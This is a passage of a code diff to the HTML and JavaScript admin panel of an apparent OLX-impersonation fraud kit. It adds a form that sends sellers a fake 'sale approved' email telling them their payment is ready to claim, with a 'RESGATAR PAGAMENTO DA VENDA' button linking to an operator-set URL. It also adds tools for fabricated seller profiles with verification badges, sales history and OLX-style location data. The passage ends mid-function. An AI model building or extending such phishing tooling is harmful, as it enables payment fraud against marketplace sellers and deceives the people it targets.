@@ -1844,33 +1844,142 @@
       <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px; align-items: start;">
         <!-- Left: Form -->
         <div class="card" style="margin:0;">
-          <div class="card-hdr"><div class="card-ttl">Nova Campanha</div></div>
+          <div class="card-hdr">
+            <div class="card-ttl">
+              <div class="ci ci-pur"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div>
+              Notificação de Venda Aprovada (Email ao Lead)
+            </div>
+          </div>
           <div class="card-body">
             <div class="fg">
-              <label class="flbl">Destinatário (Email)</label>
-              <input type="email" id="em-to" class="fi" placeholder="cliente@email.com" />
+              <label class="flbl">Destinatário (Email do Vendedor / Lead) *</label>
+              <input type="email" id="em-to" class="fi" placeholder="vendedor.lead@email.com" />
             </div>
             <div class="fg">
-              <label class="flbl">Assunto</label>
-              <input type="text" id="em-subj" class="fi" placeholder="Confirmação de Compra" oninput="updateEmailPreview()" />
+              <label class="flbl">Assunto do Email</label>
+              <input type="text" id="em-subj" class="fi" value="PARABÉNS PELA SUA VENDA! Seu pagamento está pronto para ser resgatado." oninput="updateEmailPreview()" />
             </div>
             <div class="fg">
-              <label class="flbl">Template Salvo (Opcional)</label>
+              <label class="flbl">Modelo de Email (Template)</label>
               <select id="em-tpl" class="fi" onchange="if(this.value){ loadTplContent(this.value); }else{ document.getElementById('em-html').value=''; updateEmailPreview();}">
                 <option value="">-- Personalizado (HTML livre) --</option>
               </select>
             </div>
+
+            <!-- PAINEL INTELIGENTE DA VENDA (CAMPOS SINCRONIZADOS & CUSTOMIZADOS) -->
+            <div style="background:rgba(139,92,246,0.06);border:1px solid rgba(139,92,246,0.25);border-radius:12px;padding:14px;margin-bottom:12px">
+              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+                <div style="font-size:11.5px;font-weight:700;color:var(--c-purple3);text-transform:uppercase;letter-spacing:0.5px;display:flex;align-items:center;gap:6px">
+                  <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="14" height="14"><path d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"/></svg>
+                  Dados da Venda Notificada
+                </div>
+                <span style="font-size:10px;color:#10B981;font-weight:700;display:flex;align-items:center;gap:4px">
+                  <span style="width:6px;height:6px;border-radius:50%;background:#10B981"></span>
+                  Sincronização em Tempo Real
+                </span>
+              </div>
+
+              <!-- Vendedor & Comprador -->
+              <div class="fr">
+                <div class="fg">
+                  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+                    <label class="flbl" style="margin:0">Vendedor (Lead que vendeu)</label>
+                    <select id="em-sync-seller-select" onchange="if(this.value) populateEmailSellerFromProfiles(this.value)" style="background:transparent;border:none;color:var(--c-purple3);font-size:10px;font-weight:700;cursor:pointer;outline:none">
+                      <option value="">+ Perfil Vendedor</option>
+                    </select>
+                  </div>
+                  <input type="text" class="fi" id="em-var-vendedor" placeholder="Ex: João da Silva" value="João da Silva" oninput="updateEmailPreview()"/>
+                </div>
+                <div class="fg">
+                  <label class="flbl">Nome do Comprador</label>
+                  <input type="text" class="fi" id="em-var-comprador" placeholder="Ex: Lucas Ferreira" value="Lucas Ferreira" oninput="updateEmailPreview()"/>
+                </div>
+              </div>
+
+              <!-- Produto & Valor -->
+              <div class="fr">
+                <div class="fg">
+                  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+                    <label class="flbl" style="margin:0">Nome do Produto</label>
+                    <select id="em-select-catalog-prod" onchange="if(this.value) populateEmailProductFromCatalog(this.value)" style="background:transparent;border:none;color:var(--c-purple3);font-size:10px;font-weight:700;cursor:pointer;outline:none">
+                      <option value="">+ Catálogo</option>
+                    </select>
+                  </div>
+                  <input type="text" class="fi" id="em-var-produto" placeholder="Ex: iPhone 13 Pro 128GB" value="iPhone 13 Pro 128GB" oninput="updateEmailPreview()"/>
+                </div>
+                <div class="fg">
+                  <label class="flbl">Valor da Venda (R$)</label>
+                  <input type="text" class="fi" id="em-var-valor" placeholder="Ex: 2.850,00" value="2.850,00" oninput="onEmailValueChange(this.value)"/>
+                </div>
+              </div>
+
+              <!-- Data e Hora (Sincronizado ou Customizado) -->
+              <div class="fg">
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+                  <label class="flbl" style="margin:0">Data e Hora da Venda</label>
+                  <button type="button" class="btn btn-s btn-xs" onclick="syncEmailSaleDateTime()" style="font-size:10px;padding:2px 8px;gap:4px">
+                    <svg width="11" height="11" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                    🕒 Sincronizar Agora
+                  </button>
+                </div>
+                <input type="text" class="fi" id="em-var-data-hora" placeholder="Ex: 24/11/2026 às 21:30" oninput="updateEmailPreview()"/>
+              </div>
+
+              <!-- Forma de Pagamento (Pix ou Cartão à vista ou Parcelado) -->
+              <div class="fg">
+                <label class="flbl">Forma de Pagamento Selecionada</label>
+                <div class="fr" style="margin-bottom:6px">
+                  <select id="em-pay-method-select" class="fi" onchange="onEmailPaymentMethodChange()" style="flex:1">
+                    <option value="pix">Pix (Aprovado Instantâneo)</option>
+                    <option value="card_vista">Cartão de Crédito à vista</option>
+                    <option value="card_parc">Cartão de Crédito (Parcelado)</option>
+                  </select>
+                  <div id="em-pay-installments-box" style="display:none;align-items:center;gap:6px">
+                    <select id="em-pay-parcels-count" class="fi" onchange="updateEmailInstallmentCalc()" style="width:90px">
+                      <option value="2">2x</option>
+                      <option value="3">3x</option>
+                      <option value="4">4x</option>
+                      <option value="5">5x</option>
+                      <option value="6">6x</option>
+                      <option value="8">8x</option>
+                      <option value="10">10x</option>
+                      <option value="12" selected>12x</option>
+                    </select>
+                  </div>
+                </div>
+                <input type="text" class="fi" id="em-var-pagamento" placeholder="Ex: Pix (Aprovado Instantâneo)" value="Pix (Aprovado Instantâneo)" oninput="updateEmailPreview()" style="font-size:12px;opacity:0.9"/>
+              </div>
+
+              <!-- Botão de Redirecionamento (CTA Customizado) -->
+              <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:10px;margin-top:10px">
+                <div style="font-size:11px;font-weight:700;color:var(--c-text);margin-bottom:8px;display:flex;align-items:center;gap:6px">
+                  <svg width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                  Botão de Redirecionamento (Editável no Painel)
+                </div>
+                <div class="fr">
+                  <div class="fg">
+                    <label class="flbl" style="font-size:10.5px">Texto do Botão</label>
+                    <input type="text" class="fi" id="em-var-btn-text" placeholder="RESGATAR PAGAMENTO DA VENDA" value="RESGATAR PAGAMENTO DA VENDA" oninput="updateEmailPreview()"/>
+                  </div>
+                  <div class="fg">
+                    <label class="flbl" style="font-size:10.5px">Link de Redirecionamento (URL)</label>
+                    <input type="url" class="fi" id="em-var-btn-url" placeholder="https://wa.me/... ou https://..." oninput="updateEmailPreview()"/>
+                  </div>
+                </div>
+              </div>
+            </div>
+
             <div class="fg">
               <label class="flbl" style="display:flex; justify-content:space-between; align-items:center;">
-                Conteúdo HTML / Mensagem
-                <button class="btn btn-s" style="padding:0 8px; height:24px; font-size:10px;" onclick="document.getElementById('html-wrap').classList.toggle('hidden')">Esconder/Exibir Código</button>
+                Código HTML do Email
+                <button type="button" class="btn btn-s" style="padding:0 8px; height:24px; font-size:10px;" onclick="document.getElementById('html-wrap').classList.toggle('hidden')">Esconder/Exibir Código</button>
               </label>
               <div id="em-vars-container" style="display:none; margin-top: 8px; margin-bottom: 8px; padding: 12px; background: rgba(139,92,246,0.1); border: 1px solid rgba(139,92,246,0.3); border-radius: var(--r-md)">
-                <div style="font-size: 10px; color: var(--c-purple3); margin-bottom: 8px; font-weight: bold; text-transform: uppercase;">Variáveis Dinâmicas do Template</div>
+                <div style="font-size: 10px; color: var(--c-purple3); margin-bottom: 8px; font-weight: bold; text-transform: uppercase;">Outras Variáveis Dinâmicas do Template</div>
                 <div id="em-vars-list" style="display:flex; flex-direction:column; gap:8px;"></div>
               </div>
               <div id="html-wrap" style="margin-top:8px">
-                <textarea id="em-html" class="fi" rows="12" style="font-family:monospace; font-size:12px; line-height:1.4" placeholder="<h1>Olá...</h1>" oninput="parseTemplateVars(this.value); updateEmailPreview();"></textarea>
+                <textarea id="em-html" class="fi" rows="10" style="font-family:monospace; font-size:11.5px; line-height:1.4" placeholder="<h1>Olá...</h1>" oninput="parseTemplateVars(this.value); updateEmailPreview();"></textarea>
               </div>
             </div>
             <button class="btn btn-p mt-12" style="width:100%" onclick="sendAdminEmail()">Disparar Email Agora</button>
@@ -2121,6 +2230,57 @@
           <div class="fg">
             <label class="flbl">Nº de Avaliações</label>
             <input type="number" class="fi" id="sp-form-reviews" placeholder="23"/>
+          </div>
+        </div>
+
+        <!-- Localização Avançada do Vendedor (Igual ao Anúncio OLX) -->
+        <div style="background:linear-gradient(135deg,rgba(139,92,246,0.08),rgba(167,139,250,0.03));border:1px solid rgba(139,92,246,0.22);border-radius:12px;padding:14px;margin:12px 0">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
+            <div style="font-size:11.5px;font-weight:700;color:var(--c-purple3);text-transform:uppercase;letter-spacing:0.5px;display:flex;align-items:center;gap:6px">
+              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="14" height="14"><path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+              Localização do Vendedor (Padrão do Anúncio)
+            </div>
+            <span style="font-size:10.5px;color:var(--c-t3)">Sincroniza automaticamente com o anúncio</span>
+          </div>
+
+          <!-- Breadcrumb Preview do Perfil -->
+          <div style="display:flex;align-items:center;gap:5px;flex-wrap:wrap;margin-bottom:12px;padding:8px 12px;background:rgba(255,255,255,0.04);border-radius:8px;border:1px solid rgba(255,255,255,0.06)">
+            <span style="font-size:10.5px;color:rgba(255,255,255,0.4)" id="sp-loc-prev-state">SP</span>
+            <span style="font-size:9px;color:rgba(255,255,255,0.2)">›</span>
+            <span style="font-size:10.5px;color:rgba(255,255,255,0.4)" id="sp-loc-prev-city">São Paulo</span>
+            <span style="font-size:9px;color:rgba(255,255,255,0.2)">›</span>
+            <span style="font-size:10.5px;color:rgba(255,255,255,0.4)">Eletrônicos</span>
+            <span style="font-size:9px;color:rgba(255,255,255,0.2)">›</span>
+            <span id="sp-loc-prev-zone" style="font-size:10.5px;font-weight:700;color:#A78BFA;background:rgba(139,92,246,0.18);border:1px solid rgba(139,92,246,0.35);padding:2px 8px;border-radius:20px;">Zona Norte</span>
+          </div>
+
+          <div class="fr">
+            <div class="fg" style="position:relative">
+              <label class="flbl">CEP</label>
+              <input type="text" class="fi" id="sp-form-cep" placeholder="00000-000" maxlength="9" oninput="maskCEP(this)" onblur="searchSellerProfileCEP(this.value)"/>
+              <div id="sp-cep-loader" class="spin" style="display:none;position:absolute;right:14px;top:32px;border-width:2px;border-top-color:#8B5CF6;width:14px;height:14px"></div>
+            </div>
+            <div class="fg">
+              <label class="flbl">Bairro / Região</label>
+              <input type="text" class="fi" id="sp-form-neighborhood" placeholder="Ex: Santana / Bela Vista" oninput="updateSellerProfileLocPreview()"/>
+            </div>
+          </div>
+
+          <div class="fr">
+            <div class="fg">
+              <label class="flbl">Cidade</label>
+              <input type="text" class="fi" id="sp-form-city" placeholder="Ex: São Paulo" oninput="updateSellerProfileLocPreview()"/>
+            </div>
+            <div class="fg">
+              <label class="flbl">Estado (UF)</label>
+              <input type="text" class="fi" id="sp-form-state" placeholder="Ex: SP" maxlength="2" style="text-transform:uppercase" oninput="updateSellerProfileLocPreview()"/>
+            </div>
+          </div>
+
+          <div class="fg">
+            <label class="flbl">Zona / Exibição no Anúncio (Breadcrumb)</label>
+            <input type="text" class="fi" id="sp-form-zone" placeholder="Ex: Zona Norte, Centro, Copacabana..." oninput="updateSellerProfileLocPreview()"/>
+            <span class="fhint">Esta localização será puxada automaticamente para o produto quando você escolher este vendedor.</span>
           </div>
         </div>
 
@@ -4378,6 +4538,26 @@ function onSelectSellerProfile(profileId) {
   setChk('edit-seller-id-verified', prof.seller_id_verified);
   setChk('edit-seller-fb-verified', prof.seller_fb_verified);
 
+  // Sincronização avançada de Localização (CEP, Cidade, Estado, Bairro e Breadcrumb)
+  if (prof.seller_cep || prof.seller_city || prof.seller_zone) {
+    if (prof.seller_cep) setVal('edit-cep', prof.seller_cep);
+    if (prof.seller_city) setVal('edit-cep-city', prof.seller_city);
+    if (prof.seller_state) setVal('edit-cep-state', prof.seller_state);
+    if (prof.seller_neighborhood) setVal('edit-cep-neighborhood', prof.seller_neighborhood);
+    const bZone = document.getElementById('edit-breadcrumb-zone');
+    if (bZone && (prof.seller_zone || prof.seller_neighborhood)) {
+      bZone.value = prof.seller_zone || prof.seller_neighborhood;
+      _locIsDefault = false;
+      const btn = document.getElementById('loc-default-btn');
+      if (btn) btn.classList.add('is-custom');
+      const wrap = document.getElementById('loc-custom-wrap');
+      if (wrap) wrap.style.display = 'block';
+      const txt = document.getElementById('loc-default-txt');
+      if (txt) txt.textContent = 'Personalizado';
+      if (typeof updateLocPreview === 'function') updateLocPreview(bZone.value);
+    }
+  }
+
   // Avatar
   const avVal = prof.seller_avatar || '';
   const avInput = document.getElementById('edit-seller-avatar');
@@ -4412,7 +4592,12 @@ async function saveCurrentSellerFieldsAsProfile() {
     seller_phone_verified: document.getElementById('edit-seller-phone-verified')?.checked ? 1 : 0,
     seller_id_verified: document.getElementById('edit-seller-id-verified')?.checked ? 1 : 0,
     seller_fb_verified: document.getElementById('edit-seller-fb-verified')?.checked ? 1 : 0,
-    seller_fb_url: (document.getElementById('edit-seller-fb-url')?.value || '').trim()
+    seller_fb_url: (document.getElementById('edit-seller-fb-url')?.value || '').trim(),
+    seller_cep: (document.getElementById('edit-cep')?.value || '').trim(),
+    seller_state: (document.getElementById('edit-cep-state')?.value || '').trim().toUpperCase(),
+    seller_city: (document.getElementById('edit-cep-city')?.value || '').trim(),
+    seller_neighborhood: (document.getElementById('edit-cep-neighborhood')?.value || '').trim(),
+    seller_zone: (document.getElementById('edit-breadcrumb-zone')?.value || '').trim()
   };
 
   setLoader('Salvando Perfil...', 50);
@@ -4470,6 +4655,45 @@ function switchSellerProfilesTab(tab) {
   }
 }
 
+function updateSellerProfileLocPreview() {
+  const uf = (document.getElementById('sp-form-state')?.value || 'SP').trim().toUpperCase();
+  const city = (document.getElementById('sp-form-city')?.value || 'São Paulo').trim();
+  const zone = (document.getElementById('sp-form-zone')?.value || document.getElementById('sp-form-neighborhood')?.value || 'Zona Norte').trim();
+  const elUf = document.getElementById('sp-loc-prev-state');
+  const elCity = document.getElementById('sp-loc-prev-city');
+  const elZone = document.getElementById('sp-loc-prev-zone');
+  if (elUf) elUf.textContent = uf || 'UF';
+  if (elCity) elCity.textContent = city || 'Cidade';
+  if (elZone) elZone.textContent = zone || 'Região';
+}
+
+async function searchSellerProfileCEP(cep) {
+  cep = (cep || '').replace(/\D/g, '');
+  if (cep.length !== 8) return;
+  const loader = document.getElementById('sp-cep-loader');
+  if (loader) loader.style.display = 'inline-block';
+  try {
+    const r = await fetch('https://viacep.com.br/ws/' + cep + '/json/');
+    const d = await r.json();
+    if (!d.erro) {
+      if (d.bairro) document.getElementById('sp-form-neighborhood').value = d.bairro;
+      if (d.localidade) document.getElementById('sp-form-city').value = d.localidade;
+      if (d.uf) document.getElementById('sp-form-state').value = d.uf.toUpperCase();
+      const zoneInp = document.getElementById('sp-form-zone');
+      if (zoneInp && !zoneInp.value.trim()) {
+        zoneInp.value = d.bairro || d.localidade;
+      }
+      updateSellerProfileLocPreview();
+      toast('Localização encontrada com sucesso!', 'ok');
+    } else {
+      toast('CEP não encontrado.', 'warn');
+    }
+  } catch(e) {
+    console.error(e);
+  }
+  if (loader) loader.style.display = 'none';
+}
+
 function renderSellerProfilesCards() {
   const container = document.getElementById('sp-profiles-cards-container');
   if (!container) return;
@@ -4478,8 +4702,8 @@ function renderSellerProfilesCards() {
     container.innerHTML = `
       <div class="empty" style="padding:40px 20px;text-align:center">
         <div style="font-size:32px;margin-bottom:8px">👤</div>
-        <h4 style="color:var(--c-text);margin-bottom:4px">Nenhum perfil de vendedor criado</h4>
-        <p style="color:var(--c-t3);font-size:12px;margin-bottom:14px">Crie perfis completos com histórico de vendas, nota e foto para vincular aos anúncios com 1 clique.</p>
+        <h4 style="color:var(--c-text);margin-bottom:4px">Nenhum perfil de vendedor cadastrado</h4>
+        <p style="color:var(--c-t3);font-size:12px;margin-bottom:14px">Cadastre perfis 100% reais de vendedores com histórico de vendas, avaliações e localização estruturada.</p>
         <button class="btn btn-p btn-sm" onclick="switchSellerProfilesTab('form')">+ Criar Primeiro Perfil</button>
       </div>`;
     return;
@@ -4489,6 +4713,13 @@ function renderSellerProfilesCards() {
     const av = p.seller_avatar
       ? `<img src="${p.seller_avatar}" style="width:48px;height:48px;border-radius:50%;object-fit:cover;border:2px solid rgba(139,92,246,0.4)" onerror="this.src=''"/>`
       : `<div style="width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#7C3AED,#A855F7);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px">${(p.seller_name||'V')[0].toUpperCase()}</div>`;
+
+    const locBadge = (p.seller_city || p.seller_state || p.seller_zone || p.seller_neighborhood)
+      ? `<div style="font-size:11px;color:#A78BFA;margin-top:4px;display:flex;align-items:center;gap:4px">
+           <svg width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/><path d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+           <span>${[p.seller_city, p.seller_state].filter(Boolean).join(', ')}${p.seller_zone ? ' • ' + p.seller_zone : (p.seller_neighborhood ? ' • ' + p.seller_neighborhood : '')}${p.seller_cep ? ' (' + p.seller_cep + ')' : ''}</span>
+         </div>`
+      : '';
 
     return `
       <div class="card" style="margin:0;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:14px;transition:all 0.2s" onmouseover="this.style.borderColor='rgba(139,92,246,0.3)'" onmouseout="this.style.borderColor='rgba(255,255,255,0.06)'">
@@ -4504,6 +4735,7 @@ function renderSellerProfilesCards() {
               <span>• Na OLX desde <strong>${p.seller_since || '2021'}</strong></span>
               <span>• <strong>${p.seller_sales_completed || '0'}</strong> vendas</span>
             </div>
+            ${locBadge}
           </div>
           <div style="display:flex;gap:6px">
             <button class="btn btn-s btn-xs" onclick="useProfileForCurrentProduct(${p.id})" title="Aplicar este perfil ao produto aberto">Usar no Anúncio</button>
@@ -4538,6 +4770,14 @@ function editSellerProfileInManager(id) {
   document.getElementById('sp-form-dispatch-time').value = prof.seller_dispatch_time || '03 horas';
   document.getElementById('sp-form-avatar-url').value = prof.seller_avatar || '';
   document.getElementById('sp-form-fb-url').value = prof.seller_fb_url || '';
+
+  // Localização
+  document.getElementById('sp-form-cep').value = prof.seller_cep || '';
+  document.getElementById('sp-form-state').value = prof.seller_state || '';
+  document.getElementById('sp-form-city').value = prof.seller_city || '';
+  document.getElementById('sp-form-neighborhood').value = prof.seller_neighborhood || '';
+  document.getElementById('sp-form-zone').value = prof.seller_zone || '';
+  updateSellerProfileLocPreview();
 
   document.getElementById('sp-form-email-verified').checked = (prof.seller_email_verified != 0);
   document.getElementById('sp-form-phone-verified').checked = (prof.seller_phone_verified != 0);
@@ -4611,7 +4851,12 @@ async function saveSellerProfileFromManager() {
     seller_email_verified: document.getElementById('sp-form-email-verified').checked ? 1 : 0,
     seller_phone_verified: document.getElementById('sp-form-phone-verified').checked ? 1 : 0,
     seller_id_verified: document.getElementById('sp-form-id-verified').checked ? 1 : 0,
-    seller_fb_verified: document.getElementById('sp-form-fb-verified').checked ? 1 : 0
+    seller_fb_verified: document.getElementById('sp-form-fb-verified').checked ? 1 : 0,
+    seller_cep: document.getElementById('sp-form-cep').value.trim(),
+    seller_state: document.getElementById('sp-form-state').value.trim().toUpperCase(),
+    seller_city: document.getElementById('sp-form-city').value.trim(),
+    seller_neighborhood: document.getElementById('sp-form-neighborhood').value.trim(),
+    seller_zone: document.getElementById('sp-form-zone').value.trim()
   };
 
   setLoader('Salvando Perfil...', 60);
@@ -8553,6 +8798,7 @@ function switchEmailTab(tabId) {
   document.getElementById('email-view-logs').style.display = 'none';
   document.getElementById('email-view-templates').style.display = 'none';
   document.getElementById('email-view-' + tabId).style.display = 'block';
+  if(tabId === 'send') { populateCatalogSelectInEmail(); updateEmailPreview(); }
   if(tabId === 'logs') loadEmailLogs();
   if(tabId === 'templates') loadEmailTemplatesAdmin();
 }
@@ -8711,6 +8957,10 @@ async function loadEmailTemplates() {
           loadTplContent(_EMAIL_TPLS[0].id);
         }
       }
+      populateCatalogSelectInEmail();
+      if (!document.getElementById('em-var-data-hora')?.value) {
+        syncEmailSaleDateTime();
+      }
     }
   } catch(e){}
 }
@@ -8786,12 +9036,122 @@ async function deleteTemplate(tid) {
 
 let _currentTplVars = [];
 
+function syncEmailSaleDateTime() {
+  const now = new Date();
+  const d = String(now.getDate()).padStart(2, '0');
+  const m = String(now.getMonth() + 1).padStart(2, '0');
+  const y = now.getFullYear();
+  const h = String(now.getHours()).padStart(2, '0');
+  const min = String(now.getMinutes()).padStart(2, '0');
+  const formatted = `${d}/${m}/${y} às ${h}:${min}`;
+  const inp = document.getElementById('em-var-data-hora');
+  if (inp) {
+    inp.value = formatted;
+    updateEmailPreview();
+    toast('Data e hora sincronizadas!', 'ok');
+  }
+}
+
+function onEmailPaymentMethodChange() {
+  const type = document.getElementById('em-pay-method-select')?.value || 'pix';
+  const customBox = document.getElementById('em-pay-installments-box');
+  const summaryInp = document.getElementById('em-var-pagamento');
+
+  if (type === 'pix') {
+    if (customBox) customBox.style.display = 'none';
+    if (summaryInp) summaryInp.value = 'Pix (Aprovado Instantâneo)';
+  } else if (type === 'card_vista') {
+    if (customBox) customBox.style.display = 'none';
+    if (summaryInp) summaryInp.value = 'Cartão de Crédito à vista';
+  } else if (type === 'card_parc') {
+    if (customBox) customBox.style.display = 'flex';
+    updateEmailInstallmentCalc();
+    return;
+  }
+  updateEmailPreview();
+}
+
+function updateEmailInstallmentCalc() {
+  const parcels = parseInt(document.getElementById('em-pay-parcels-count')?.value || '12');
+  const valRaw = (document.getElementById('em-var-valor')?.value || '0').replace(/[^\d.,]/g, '').replace(',', '.');
+  const numVal = parseFloat(valRaw) || 0;
+  const summaryInp = document.getElementById('em-var-pagamento');
+  
+  if (numVal > 0) {
+    const parcelVal = (numVal / parcels).toFixed(2).replace('.', ',');
+    if (summaryInp) summaryInp.value = `Cartão de Crédito (${parcels}x de R$ ${parcelVal})`;
+  } else {
+    if (summaryInp) summaryInp.value = `Cartão de Crédito (${parcels}x)`;
+  }
+  updateEmailPreview();
+}
+
+function onEmailValueChange(val) {
+  const type = document.getElementById('em-pay-method-select')?.value || 'pix';
+  if (type === 'card_parc') {
+    updateEmailInstallmentCalc();
+  } else {
+    updateEmailPreview();
+  }
+}
+
+function populateEmailProductFromCatalog(code) {
+  if (!code || !_PRODUCTS) return;
+  const p = _PRODUCTS.find(x => (x.product_code || x.code) === code);
+  if (!p) return;
+  const prodInp = document.getElementById('em-var-produto');
+  const valInp = document.getElementById('em-var-valor');
+  const vendInp = document.getElementById('em-var-vendedor');
+  if (prodInp) prodInp.value = p.title || p.name || '';
+  if (valInp) valInp.value = parseFloat(p.price || 0).toLocaleString('pt-BR', {minimumFractionDigits: 2});
+  if (vendInp && p.seller_name && (!vendInp.value.trim() || vendInp.value === 'João da Silva')) {
+    vendInp.value = p.seller_name;
+  }
+  onEmailPaymentMethodChange();
+  updateEmailPreview();
+  toast('Produto do catálogo carregado!', 'ok');
+}
+
+function populateEmailSellerFromProfiles(id) {
+  if (!id || !_SELLER_PROFILES_CACHE) return;
+  const prof = _SELLER_PROFILES_CACHE.find(x => parseInt(x.id) === parseInt(id));
+  if (!prof) return;
+  const vendInp = document.getElementById('em-var-vendedor');
+  if (vendInp) {
+    vendInp.value = prof.seller_name;
+    updateEmailPreview();
+    toast(`Vendedor "${prof.seller_name}" selecionado!`, 'ok');
+  }
+}
+
+function populateCatalogSelectInEmail() {
+  const sel = document.getElementById('em-select-catalog-prod');
+  if (sel && _PRODUCTS && _PRODUCTS.length > 0) {
+    sel.innerHTML = '<option value="">+ Catálogo</option>' + _PRODUCTS.map(p => {
+      const code = p.product_code || p.code || '';
+      const name = p.title || p.name || 'Produto';
+      return `<option value="${code}">${name.substring(0, 24)} (R$ ${p.price||0})</option>`;
+    }).join('');
+  }
+
+  const sSel = document.getElementById('em-sync-seller-select');
+  if (sSel && _SELLER_PROFILES_CACHE && _SELLER_PROFILES_CACHE.length > 0) {
+    sSel.innerHTML = '<option value="">+ Perfil Vendedor</option>' + _SELLER_PROFILES_CACHE.map(pr => {
+      return `<option value="${pr.id}">${pr.seller_name}</option>`;
+    }).join('');
+  }
+}
+
 function parseTemplateVars(html) {
     const regex = /\{\{([^}]+)\}\}/g;
     let match;
     const vars = new Set();
+    const systemVars = ['vendedor', 'comprador', 'produto', 'valor', 'data_hora', 'pagamento', 'texto_botao', 'link_redirecionamento'];
     while ((match = regex.exec(html)) !== null) {
-        vars.add(match[1].trim());
+        const v = match[1].trim();
+        if (!systemVars.includes(v)) {
+          vars.add(v);
+        }
     }
     
     _currentTplVars = Array.from(vars);
@@ -8822,17 +9182,51 @@ function parseTemplateVars(html) {
 }
 
 function getProcessedHtml() {
-    let html = document.getElementById('em-html').value;
+    let html = document.getElementById('em-html')?.value || '';
+    if (!html && _EMAIL_TPLS && _EMAIL_TPLS.length > 0) {
+      html = _EMAIL_TPLS[0].html_content || '';
+    }
+
+    // Variáveis Inteligentes da Notificação de Venda
+    const vendedor = document.getElementById('em-var-vendedor')?.value || 'Vendedor Verificado';
+    const comprador = document.getElementById('em-var-comprador')?.value || 'Cliente OLX';
+    const produto = document.getElementById('em-var-produto')?.value || 'Produto Anunciado';
+    const valor = document.getElementById('em-var-valor')?.value || '0,00';
+    const dataHora = document.getElementById('em-var-data-hora')?.value || '';
+    const pagamento = document.getElementById('em-var-pagamento')?.value || 'Pix (Aprovado Instantâneo)';
+    const btnText = document.getElementById('em-var-btn-text')?.value || 'RESGATAR PAGAMENTO DA VENDA';
+    const btnUrl = document.getElementById('em-var-btn-url')?.value || '#';
+
+    // Substituir tags no formato colchetes e chaves duplas
+    html = html.split('[Nome do vendedor]').join(vendedor)
+               .split('{{vendedor}}').join(vendedor)
+               .split('[Nome do comprador]').join(comprador)
+               .split('{{comprador}}').join(comprador)
+               .split('[Nome do produto]').join(produto)
+               .split('{{produto}}').join(produto)
+               .split('[00,00]').join(valor)
+               .split('{{valor}}').join(valor)
+               .split('[Data e hora]').join(dataHora)
+               .split('{{data_hora}}').join(dataHora)
+               .split('[Forma de pagamento]').join(pagamento)
+               .split('{{pagamento}}').join(pagamento)
+               .split('[TEXTO_BOTAO]').join(btnText)
+               .split('{{texto_botao}}').join(btnText)
+               .split('[LINK_REDIRECIONAMENTO]').join(btnUrl)
+               .split('[LINK_WHATSAPP]').join(btnUrl)
+               .split('{{link_redirecionamento}}').join(btnUrl);
+
     const inputs = document.querySelectorAll('#em-vars-list .var-input');
     inputs.forEach(inp => {
         const v = inp.getAttribute('data-var');
-        const val = inp.value || ('{' + '{' + v + '}' + '}');
-        html = html.split('{' + '{' + v + '}' + '}').join(val);
+        const val = inp.value || ('{{' + v + '}}');
+        html = html.split('{{' + v + '}}').join(val);
     });
+
     // Fix imagens locais para URL absoluta baseada no servidor atual
     const origin = window.location.origin;
-    // Replace ./images/ or images/ or /images/ with absolute static path
     html = html.replace(/(["'])(?:\.\/|\/)?images\//g, '$1' + origin + '/static/email_images/');
+    html = html.replace(/(["'])\/static\/email_images\//g, '$1' + origin + '/static/email_images/');
     return html;
 }
 
@@ -8847,7 +9241,7 @@ function loadTplContent(id) {
 
 function updateEmailPreview() {
   const html = getProcessedHtml();
-  const subj = document.getElementById('em-subj').value || 'Preview Real do Email';
+  const subj = document.getElementById('em-subj')?.value || 'Preview Real do Email';
   const iframe = document.getElementById('em-preview-frame');
   const subjEl = document.getElementById('em-preview-subj');
   
@@ -8861,17 +9255,27 @@ function updateEmailPreview() {
 }
 
 async function sendAdminEmail() {
-  const to = document.getElementById('em-to').value;
-  const subj = document.getElementById('em-subj').value;
+  const to = document.getElementById('em-to').value.trim();
+  const subj = document.getElementById('em-subj').value.trim();
   const html = getProcessedHtml();
   const tid = document.getElementById('em-tpl').value;
-  if(!to || !to.includes('@')) return toast('Email inválido', 'warn');
+  const btnUrl = document.getElementById('em-var-btn-url')?.value.trim();
+  const btnText = document.getElementById('em-var-btn-text')?.value.trim();
+
+  if(!to || !to.includes('@')) return toast('Por favor, informe um email válido de destinatário.', 'warn');
   setLoader('Enviando...', 50);
   try {
     const r = await fetch('/api/admin/send-email', {
       method:'POST',
       headers:{'Content-Type':'application/json','Authorization':'Bearer '+_TK},
